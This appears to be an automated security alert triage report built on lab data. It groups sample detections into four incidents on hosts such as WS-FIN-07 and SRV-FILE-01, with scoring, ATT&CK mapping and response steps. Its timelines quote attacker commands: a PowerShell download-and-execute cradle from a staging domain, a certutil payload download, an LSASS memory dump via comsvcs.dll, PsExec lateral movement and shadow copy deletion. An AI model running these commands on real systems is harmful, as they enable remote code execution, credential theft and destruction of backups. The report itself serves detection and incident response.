# Alert Triage Report

- **Generated:** 2026-10-29 11:43 UTC
- **Input:** `sample_alerts.json`
- **Enrichment mode:** offline (local watchlist only)
- **Alerts:** 15  |  **Incidents:** 4

## Summary

| Incident | Priority | Score | Host | Window (UTC) | Alerts | Tactics | Related |
|---|---|---|---|---|---|---|---|
| [INC-001](#inc-001) | **P1** | 100 | WS-FIN-07 | 10-20 09:12 → 09:52 | 9 | 8 | INC-002 |
| [INC-002](#inc-002) | **P1** | 100 | SRV-FILE-01 | 10-20 09:52 → 10:04 | 4 | 5 | INC-001 |
| [INC-003](#inc-003) | **P2** | 75 | RDP-JUMP-01 | 10-20 03:15 → 03:15 | 1 | 1 | - |
| [INC-004](#inc-004) | **P4** | 20 | WS-HR-02 | 10-20 11:30 → 11:30 | 1 | 1 | - |

---

<a id="inc-001"></a>
## INC-001 — WS-FIN-07 (P1, score 100)

- **Window:** 2026-10-20 09:12:04 → 2026-10-20 09:52:47 UTC
- **Asset:** Finance workstation (criticality: medium)
- **Accounts:** CORP\j.rahman, CORP\svc_backup
- **ATT&CK progression:** Initial Access → Execution → Persistence → Defense Evasion → Credential Access → Discovery → Lateral Movement → Command and Control
- **Techniques:** `T1003.001`, `T1021.002`, `T1027`, `T1033`, `T1059.001`, `T1087.002`, `T1105`, `T1204.002`, `T1218`, `T1218.011`, `T1482`, `T1547.001`, `T1566.001`, `T1569.002`
- **Related:** [INC-002](#inc-002) on SRV-FILE-01 — WS-FIN-07 executed remotely on SRV-FILE-01; shared IOC 783c261abc7ffd40f368bb3aacfe34b1ea72dd72a2fd5044e07846223c43100b

**Why this score**

- highest alert score 80
- 8 ATT&CK tactics observed (+35)
- top alert `ALR-1002` (Microsoft Office Application Spawning a Shell or Script Host):
  - base high severity (+45)
  - 1 malicious IOC(s): update-cdn.example (+20)
  - medium-criticality asset: Finance workstation (+5)
  - decoded PowerShell contains downloadstring, iex, net.webclient (+10)

### Timeline

| Time (UTC) | Score | Alert | Rule | User | Command / Process |
|---|---|---|---|---|---|
| 09:12:04 | 80 | ALR-1002 | Microsoft Office Application Spawning a Shell or Script Host | CORP\j.rahman | `powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAF…` |
| 09:12:04 | 80 | ALR-1003 | PowerShell Encoded Command Execution | CORP\j.rahman | `powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAF…` |
| 09:12:40 | 70 | ALR-1004 | Certutil Used to Download a File | CORP\j.rahman | `certutil.exe -urlcache -split -f http://198.51.100.23/svch.exe C:\Users\Public\svch.exe` |
| 09:14:10 | 50 | ALR-1005 | Registry Run Key Points to Suspicious Location | CORP\j.rahman | `HKU\S-1-5-21-1004\Software\Microsoft\Windows\CurrentVersion\Run\SvcHostHelper = C:\Users\…` |
| 09:20:33 | 15 | ALR-1006 | Domain and Privilege Discovery Commands | CORP\j.rahman | `whoami /all` |
| 09:21:02 | 15 | ALR-1007 | Domain and Privilege Discovery Commands | CORP\j.rahman | `net group "domain admins" /domain` |
| 09:21:30 | 15 | ALR-1008 | Domain and Privilege Discovery Commands | CORP\j.rahman | `nltest /domain_trusts` |
| 09:35:12 | 75 | ALR-1009 | LSASS Dump via comsvcs.dll MiniDump | CORP\j.rahman | `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Users\Public\d.dmp full` |
| 09:52:47 | 40 | ALR-1010 | Remote Execution via PsExec Service | CORP\svc_backup | `PsExec64.exe \\SRV-FILE-01 -accepteula -s cmd.exe` |

### Decoded PowerShell

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://update-cdn.example/stage1.ps1')
```

### Indicators

| Type | Value | Verdict | Sources | Notes |
|---|---|---|---|---|
| domain | `update-cdn.example` | **malicious** | internal-ti | Staging domain seen in phishing campaign (lab data) |
| ip | `198.51.100.23` | **malicious** | internal-ti | Payload host serving svch.exe (lab data) |
| sha256 | `783c261abc7ffd40f368bb3aacfe34b1ea72dd72a2fd5044e07846223c43100b` | **malicious** | internal-ti | svch.exe loader (lab data) |
| sha256 | `e8beeb60a46d78a58413bdb0c48e9af0d9092f44c01851e666b93e848e814e6e` | unknown | - | - |
| url | `http://update-cdn.example/stage1.ps1` | unknown | - | - |
| url | `http://198.51.100.23/svch.exe` | unknown | - | - |
| ip | `10.10.20.37` | unknown | - | internal address - not sent to external intel |
| ip | `10.10.5.12` | unknown | - | internal address - not sent to external intel |

### Recommended actions

- **Command and Control:** Block the IPs/domains at the proxy, firewall and DNS; search proxy logs for other hosts contacting them.
- **Lateral Movement:** Isolate source and destination hosts; block SMB/WinRM/RDP between workstations; review logons by the account used.
- **Discovery:** Correlate with any later lateral movement; discovery alone is low-confidence.
- **Credential Access:** Treat every account that logged on to the host as compromised: reset passwords, revoke sessions/tokens, and reset KRBTGT twice if domain admin creds are suspected.
- **Defense Evasion:** Assume logs on this host are incomplete; rely on SIEM/EDR copies and check whether security tooling was tampered with.
- **Persistence:** Remove persistence (Run keys, scheduled tasks, services) only after evidence is preserved; hunt for the same artefact fleet-wide.
- **Execution:** Collect the full process tree and command lines; acquire suspicious binaries/scripts for analysis.
- **Initial Access:** Find the delivery vector (email, download, exposed service); block the sender/URL and search for other recipients.

---

<a id="inc-002"></a>
## INC-002 — SRV-FILE-01 (P1, score 100)

- **Window:** 2026-10-20 09:52:49 → 2026-10-20 10:04:15 UTC
- **Asset:** File server (finance and HR shares) (criticality: high)
- **Accounts:** NT AUTHORITY\SYSTEM
- **ATT&CK progression:** Execution → Persistence → Defense Evasion → Lateral Movement → Impact
- **Techniques:** `T1021.002`, `T1053.005`, `T1070.001`, `T1490`, `T1569.002`
- **Related:** [INC-001](#inc-001) on WS-FIN-07 — shared IOC 783c261abc7ffd40f368bb3aacfe34b1ea72dd72a2fd5044e07846223c43100b

**Why this score**

- highest alert score 85
- 5 ATT&CK tactics observed (+20)
- top alert `ALR-1013` (Volume Shadow Copy Deletion):
  - base critical severity (+70)
  - high-criticality asset: File server (finance and HR shares) (+15)

### Timeline

| Time (UTC) | Score | Alert | Rule | User | Command / Process |
|---|---|---|---|---|---|
| 09:52:49 | 40 | ALR-1011 | Remote Execution via PsExec Service | NT AUTHORITY\SYSTEM | `cmd.exe` |
| 09:55:03 | 60 | ALR-1012 | Scheduled Task Created With Suspicious Action | NT AUTHORITY\SYSTEM | `schtasks /create /tn "MicrosoftEdgeUpdateCore" /tr "C:\ProgramData\svch.exe" /sc onlogon …` |
| 10:03:41 | 85 | ALR-1013 | Volume Shadow Copy Deletion | NT AUTHORITY\SYSTEM | `vssadmin.exe delete shadows /all /quiet` |
| 10:04:15 | 60 | ALR-1014 | Security Event Log Cleared | NT AUTHORITY\SYSTEM | - |

### Indicators

| Type | Value | Verdict | Sources | Notes |
|---|---|---|---|---|
| sha256 | `783c261abc7ffd40f368bb3aacfe34b1ea72dd72a2fd5044e07846223c43100b` | **malicious** | internal-ti | svch.exe loader (lab data) |
| ip | `10.10.20.37` | unknown | - | internal address - not sent to external intel |

### Recommended actions

- **Impact:** ESCALATE IMMEDIATELY: isolate the host, verify offline backups, and start the ransomware playbook.
- **Lateral Movement:** Isolate source and destination hosts; block SMB/WinRM/RDP between workstations; review logons by the account used.
- **Defense Evasion:** Assume logs on this host are incomplete; rely on SIEM/EDR copies and check whether security tooling was tampered with.
- **Persistence:** Remove persistence (Run keys, scheduled tasks, services) only after evidence is preserved; hunt for the same artefact fleet-wide.
- **Execution:** Collect the full process tree and command lines; acquire suspicious binaries/scripts for analysis.

---

<a id="inc-003"></a>
## INC-003 — RDP-JUMP-01 (P2, score 75)

- **Window:** 2026-10-20 03:15:22 → 2026-10-20 03:15:22 UTC
- **Asset:** Internet-facing RDP jump host (criticality: high)
- **Accounts:** administrator
- **ATT&CK progression:** Credential Access
- **Techniques:** `T1110.001`

**Why this score**

- highest alert score 75
- top alert `ALR-1001` (Brute Force - 10 or More Failed Logons From One Source in 5 Minutes):
  - base medium severity (+25)
  - 1 malicious IOC(s): 203.0.113.77 (+20)
  - high-criticality asset: Internet-facing RDP jump host (+15)
  - privileged account administrator (+10)
  - high volume: 48 events (+5)

### Timeline

| Time (UTC) | Score | Alert | Rule | User | Command / Process |
|---|---|---|---|---|---|
| 03:15:22 | 75 | ALR-1001 | Brute Force - 10 or More Failed Logons From One Source in 5… | administrator | - |

### Indicators

| Type | Value | Verdict | Sources | Notes |
|---|---|---|---|---|
| ip | `203.0.113.77` | **malicious** | internal-ti | Mass RDP brute-forcer (lab data) |

### Recommended actions

- **Credential Access:** Treat every account that logged on to the host as compromised: reset passwords, revoke sessions/tokens, and reset KRBTGT twice if domain admin creds are suspected.

---

<a id="inc-004"></a>
## INC-004 — WS-HR-02 (P4, score 20)

- **Window:** 2026-10-20 11:30:00 → 2026-10-20 11:30:00 UTC
- **Asset:** HR workstation (criticality: low)
- **Accounts:** CORP\it.admin
- **ATT&CK progression:** Persistence
- **Techniques:** `T1053.005`

**Why this score**

- highest alert score 20
- top alert `ALR-1015` (Scheduled Task Created With Suspicious Action):
  - base medium severity (+25)
  - file hash is on the known-good list (-15)
  - privileged account CORP\it.admin (+10)

### Timeline

| Time (UTC) | Score | Alert | Rule | User | Command / Process |
|---|---|---|---|---|---|
| 11:30:00 | 20 | ALR-1015 | Scheduled Task Created With Suspicious Action | CORP\it.admin | `schtasks /create /tn "Adobe Acrobat Update Task" /tr "C:\ProgramData\Adobe\ARM\AdobeARM.e…` |

### Indicators

| Type | Value | Verdict | Sources | Notes |
|---|---|---|---|---|
| sha256 | `8745a9741618ba4816c65083904f6a5ced3bb5954335b8ec8c316e8ba0facafe` | clean | internal-ti | AdobeARM.exe signed updater (lab data) |

### Recommended actions

- **Persistence:** Remove persistence (Run keys, scheduled tasks, services) only after evidence is preserved; hunt for the same artefact fleet-wide.

---

_Scores are decision support, not a verdict. Validate every P1/P2 before acting._
